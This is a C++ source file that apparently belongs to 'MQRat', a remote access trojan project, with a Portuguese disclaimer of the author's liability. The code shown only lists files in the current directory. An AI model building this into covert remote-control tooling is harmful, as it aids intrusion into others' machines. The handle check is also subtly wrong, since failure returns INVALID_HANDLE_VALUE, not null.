/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <windows.h>
#include "api.hpp"
#include "fs.hpp"

vector<string> API::FileSystem::ListFiles()
{
    WIN32_FIND_DATA fdata;
    vector<string> file_list;

    HANDLE handle = FindFirstFileA("*.*", &fdata);
    if(!handle) {
        return file_list;
    }

    do {
        if(!IS_NODE_DIR(fdata.cFileName)) {
            file_list.push_back(fdata.cFileName);
        }
    } while(FindNextFileA(handle, &fdata));

    FindClose(handle);

    return file_list;
}
